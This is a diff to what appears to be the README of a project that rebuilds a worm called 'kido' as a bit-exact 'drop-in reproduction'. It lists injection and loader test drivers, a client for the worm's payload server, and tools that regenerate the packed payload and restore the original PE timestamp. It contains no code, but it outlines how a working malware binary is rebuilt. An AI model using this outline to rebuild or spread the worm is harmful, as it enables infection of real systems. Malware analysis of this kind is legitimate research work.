@@ -81,9 +81,10 @@ src/test/                  drivers, built on host, run on the analysis VM
   test_crypto.cpp          self-test of the crypto primitives (no network)
   decode_test.cpp          proves the embedded stage-2 decodes bit-exact
   worm_load.cpp            loads the worm via the system loader; scans for + GETs the HTTP server
-  inject2_test.cpp         maps stage-1 into a clean child process and calls its EP (full 3-layer chain)
+  inject2_test.cpp         LoadLibrary's stage-1 in a clean child process (full 3-layer reflective chain)
   inject_test.cpp          manual-map + direct-EP in-process driver
   load_test.cpp            plain LoadLibrary driver
+  kido_get.cpp             HTTP GET client for the worm's payload server
 tools/
   gen_stage2_payload.py    regenerates stage2_payload.h from the packed worm
   patch_timestamp.py       sets a PE's TimeDateStamp to the original value
@@ -102,7 +103,7 @@ build.bat
   original keystream (stage 1) — **this is the drop-in reproduction of
   kido.sample**
 * `test_crypto.exe`, `decode_test.exe`, `worm_load.exe`,
-  `inject_test.exe`, `inject2_test.exe`, `load_test.exe`
+  `inject_test.exe`, `inject2_test.exe`, `load_test.exe`, `kido_get.exe`
 
 The build is size-optimised and PDB-free: `/O2 /Oy- /GF /Gy`, `/MD` dynamic CRT
 (the original worm dynamically linked its CRT — `MSVCRT.dll` in its import
